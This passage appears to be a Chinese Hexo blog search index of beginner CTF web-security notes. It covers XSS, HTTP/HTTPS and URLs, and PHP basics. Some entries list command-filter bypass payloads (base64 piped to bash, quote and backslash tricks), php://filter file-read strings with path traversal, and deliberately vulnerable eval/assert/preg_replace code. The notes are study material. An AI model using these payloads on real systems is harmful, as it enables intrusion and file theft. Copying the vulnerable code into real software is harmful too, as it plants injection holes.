class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h1>黑名单绕过</h1><p>1.拼接</p><p>payload=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><p>2.利用已存在的资源</p><p>从已有的文件或者环境变量中获得相应的字符。</p><p>3.base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>4.单引号、双引号</p><p>payload1=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at flag</span><br></pre></td></tr></table></figure><p>payload2=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at fl&quot;&quot;ag</span><br></pre></td></tr></table></figure><p>payload3=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure><p>5.反斜线 \</p><p>payload=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><p>6.LINUX下一些已有字符</p><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss攻击基础了解</title>
      <link href="/2023/11/23/day7/"/>
      <url>/2023/11/23/day7/</url>
      
        <content type="html"><![CDATA[<h1>XSS攻击</h1><h2 id="XSS的了解">XSS的了解</h2><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。若受害者运行这些恶意代码，攻击者就可以突破网站的访问限制并冒充受害者。根据开放式 Web 应用安全项目（OWASP），XSS 在 2017 年被认为 <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">7 种最常见的 Web 应用程序漏洞之一</a>。</p><p>如果 Web 应用程序没有部署足够的安全验证，那么，这些攻击很容易成功。浏览器无法探测到这些恶意脚本是不可信的，所以，这些脚本可以任意读取 cookie，session tokens，或者其他敏感的网站信息，或者让恶意脚本重写<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTML">HTML</a>内容。</p><p>在以下 2 种情况下，容易发生 XSS 攻击：</p><ol><li><p>数据从一个不可靠的链接进入到一个 Web 应用程序。</p></li><li><p>没有过滤掉恶意代码的动态内容被发送给 Web 用户。</p><p>恶意内容一般包括 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/JavaScript">JavaScript</a>，但是，有时候也会包括 HTML，FLASH 或是其他浏览器可执行的代码。XSS 攻击的形式千差万别，但他们通常都会：将 cookies 或其他隐私信息发送给攻击者，将受害者重定向到由攻击者控制的网页，或是经由恶意网站在受害者的机器上进行其他恶意操作。</p><p>XSS 攻击可以分为 3 类：存储型（持久型）、反射型（非持久型）、DOM 型。</p><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%AD%98%E5%82%A8%E5%9E%8B_xss"><strong>存储型 XSS</strong></a></p><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%8F%8D%E5%B0%84%E5%9E%8B_xss"><strong>反射型 XSS</strong></a></p><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自&quot;可信任&quot;的服务器，所以会执行这段脚本。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%9F%BA%E4%BA%8E_dom_%E7%9A%84_xss"><strong>基于 DOM 的 XSS</strong></a></p><p>通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p></li></ul></li></ol><h2 id="原理">原理</h2><p>XSS和SQLI、RCE本质上都是注入类漏洞，核心要义都是构造payload逃逸程序原有的处理逻辑进而欺骗目标系统执行恶意代码。</p><p>XSS将恶意代码注入到网页中，使用户加载并执行攻击者恶意制造的网页程序。恶意代码通常是JavaScript、Java组件，VBScript，ActiveX，Flash或者就是原生的HTML。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP和HTTPS协议</title>
      <link href="/2023/11/20/day3/"/>
      <url>/2023/11/20/day3/</url>
      
        <content type="html"><![CDATA[<h1>http协议与https协议</h1><h2 id="http简介">http简介</h2><p>1.HTTP 协议是 Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（ WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议.</p><p>2.http协议是基于tcp/ip协议来传输数据（html文件、图片文件、查询结果等）</p><p>3.http的url是由<a href="http://xn--exs751j">http://起始</a>，默认使用端口为80</p><h2 id="http工作原理">http工作原理</h2><p>1.http协议工作于客户端-服务器架构上</p><p>2.浏览器作为http客户端通过url向http服务端即web服务器发送所有的请求。</p><p>3.web服务器接受到请求后，向客户端发送响应信息</p><p>4.http的默认端口号为80，但可以改为其他的端口</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/11/cgiarch.gif" alt="cgiarch"></p><p>http协议的工作原理示意图</p><h1>https简介</h1><p>https经由http进行通信，但是利用ssl/tls来加密数据包，https的开发的主要目的是提供对网站服务器的身份认证，保护交换资料的隐私和完整性。</p><p>https的url是由<a href="https://xn--exs751j">https://起始</a>，默认端口为443</p><h2 id="https的作用">https的作用</h2><p>信任的情况：</p><p>与一个网站之间的 HTTPS 连线仅在这些情况下可被信任：</p><ul><li>浏览器正确地实现了 HTTPS 且操作系统中安装了正确且受信任的证书颁发机构；</li><li>证书颁发机构仅信任合法的网站；</li><li>被访问的网站提供了一个有效的证书，也就是说它是一个由操作系统信任的证书颁发机构签发的（大部分浏览器会对无效的证书发出警告）；（可以人为的添加证书，如bp的使用则需要人为的给浏览器添加证书）</li><li>该证书正确地验证了被访问的网站（例如，访问 <a href="https://www.runoob.com/">https://www.runoob.com</a> 时收到了签发给 <a href="http://www.runoob.com">www.runoob.com</a> 而不是其它域名的证书）；</li><li>此协议的加密层（SSL/TLS）能够有效地提供认证和高强度的加密。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习（2）</title>
      <link href="/2023/11/20/day4/"/>
      <url>/2023/11/20/day4/</url>
      
        <content type="html"><![CDATA[<h1>web基础知识</h1><h2 id="php文件有以下几种备份的格式">php文件有以下几种备份的格式:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.git .svn .swp .bak .bash-history</span><br></pre></td></tr></table></figure><p>类如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php.git</span><br></pre></td></tr></table></figure><h2 id="robots协议">robots协议</h2><p>robots协议规定了哪些东西可以抓取，哪些东西不能够抓取。robots.txt是一个文本文件也是一个协议。其可以在搜索引擎中访问网站中要查看的第一个文件。</p><h2 id="cookie">cookie</h2><p>cookie是主机访问web服务器由服务器创建的，将信息储存在用户计算机上的文件，一般用户习惯使用cookies</p><p>cookie的使用：</p><p>1…判断用户是否已经登录网站</p><p>2.购物车网站用户跳转保存在其中的数据</p><p>3.等等等</p><h2 id="php对于文件的读取">php对于文件的读取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h3 id="组成解析">组成解析</h3><p>1.php://filter/可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p><p>2.read=convert.base64-encode/resource将数据转换为base64编码来读取数据</p><p>3.=index.php读取的文件</p><h3 id="添加：">添加：</h3><p>读取上级目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=.../.../a.txt</span><br></pre></td></tr></table></figure><p>读取其他的目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=F：\b.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php命令注入及其实例</title>
      <link href="/2023/11/20/day5/"/>
      <url>/2023/11/20/day5/</url>
      
        <content type="html"><![CDATA[<h1>php注入概述</h1><p>rce概念：remote command/code execute，远程命令/代码执行。</p><p>php代码执行：在web中，php代码执行是指应用程序过滤不严，用户可通过http请求将代码注入到应用中执行</p><p>php代码注入与sql注入比较：</p><p>注入的思想类似，均是构造语句绕过服务器的过滤去执行。</p><p>区别在于sql注入是将语句注入到数据库中执行，而php代码执行是可以将代码注入到应用中，最终由服务器运行。</p><p>php代码注入的条件：</p><p>1.程序中含有可以执行php代码的函数或者语言结构</p><p>2.传入该函数或者语言结构的参数是可以由客户端控制的（可以直接修改或者造成影响）且应用过滤不严。</p><p>危害：</p><p>这样的漏洞如果没有特殊的过滤，相当于一个web后门的存在，攻击者可以执行漏洞继承web用户权限，执行任意代码。如果服务器没有正确配置或者web用户权限比较高的话，还可以读写靶机服务器任意文件的内容，甚至控制整个网站或者服务器。</p><h1>相关的函数或语言结构</h1><h2 id="1-eval-函数">1.eval()函数</h2><p>作用：该函数的作用是将字符串作为PHP代码执行。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;Please submit code!&lt;br &gt;code=phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：<br>①普通方式提交变量：<code>?code=phpinfo();</code><br>②以语句块方式提交变量：<code>?code=&#123;phpinfo();&#125;</code><br>③以多语句方式提交参数：<code>?code=1;phpinfo();</code></p><p>payload:?code=</p><h2 id="2-assert-函数">2.assert()函数</h2><p>作用：该函数的作用是将字符串作为PHP代码执行。如果它的条件返回错误，则终止程序执行。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">assert($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;Please submit code!&lt;br &gt;?code=phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>普通方式提交变量：<code>?code=phpinfo()</code>或者<code>?code=phpinfo();</code><br>与eval()函数有别的是，该函数不能执行传入语句块或多语句作为参数。</p><h2 id="3-preg-replace-函数">3.preg_replace()函数</h2><p>作用：该函数用于对字符串进行正则处理。</p><p>解析：preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;/abcd/e&quot;,$_POST[&#x27;hacker&#x27;],&quot;abcdefg&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：<br>①普通方式提交变量：?code=[phpinfo();]，[]是由于preg_replace的第一个参数有分号。<br>②以语句块方式提交变量：?code={[phpinfo();]}<br>③以多语句方式提交参数：?code=1;[phpinfo();]</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web网络学习（1）</title>
      <link href="/2023/11/16/day2/"/>
      <url>/2023/11/16/day2/</url>
      
        <content type="html"><![CDATA[<p><strong>01.get&amp;&amp;post的区别：</strong></p><p>1.传送方式的不同：get通过url进行传参，而post通过dao文传输。</p><p>2.传送长度的不同：get因为通过url栏进行传参，所以其长度是有限的，受限于url栏的长度。而post则没有限制。</p><p>3.get产生一个tcp数据包，而Post产生两个数据包。</p><p>get请求，浏览器会把header和data一起发送出去，服务器响应200</p><p>post请求，浏览器会先发送header，然后服务器响应100，之后再发送data，浏览器响应200。</p><p>4.get请求是幂等的，即多次请求同一个资源会得到相同的结果，而post请求是非幂等的，即多次请求之后对同一个资源会产生不同的结果。</p><p>5.get请求通常用来获取资源，而post请求通常用来提交数据发送表单，进行状态修改等操作。</p><p>6.get请求可以缓存，可以被存为书签，可以被浏览器的历史纪录查询，而post请求则都不能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?...=...</span><br></pre></td></tr></table></figure><p><strong>02url栏的组成</strong></p><p>例子：<a href="http://thecat.top/">http://thecat.top</a>:80/cat/index.phpuserID=1&amp;passwordID=123456#OK</p><p>1.协议部分：该url的协议部分为http://</p><p>2.域名部分：该url的域名为thecat.top，也可以用ip作为域名来使用。</p><p>3.端口部分：跟在域名后面为端口，端口和域名之间用：作为间隔。端口不是url的必须部分。</p><p>4.虚拟目录部分：从域名后第一个/开始到最后一个/位置为虚拟目录位置，虚拟目录也并不是一个url所必须的部分。</p><p>5.文件名部分：从域名后的最后一个/开始到？为止，为文件名部分，如果没有？，则是从域名后的最后一个/开始到#为止。如果没有？或者#则从域名最后的一个/开始到结束都是文件名部分。文件名部分也不是一个url所必须的部分</p><p>6.锚部分：从#开始到最后都是锚部分，锚点表示资源中的一种“书签”，给浏览器显示位于该“加书签”位置的内容的方向。锚部分也不是url所必须的部分。</p><p>7.参数部分从？开始到#号为止的部分为参数部分，又称搜索部分，查询部分等。参数部分可以存在多个参数，之间用&amp;连接。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习（1）</title>
      <link href="/2023/11/15/day1/"/>
      <url>/2023/11/15/day1/</url>
      
        <content type="html"><![CDATA[<p>is_string()：检测变量是否是字符串<br>isset()：检测变量是否已设置并且非 NULL<br>in_array(要搜索的值，要搜索的数组)：搜索数组中是否存在指定的值<br>mb_substr($page，n，m)：返回page中从第n位开始，到n+m位字符串的值<br>mb_strpos()：查找字符串在另一个字符串中首次出现的位置<br>urldecode()：将url编码后的字符串还原成未编码的样子</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
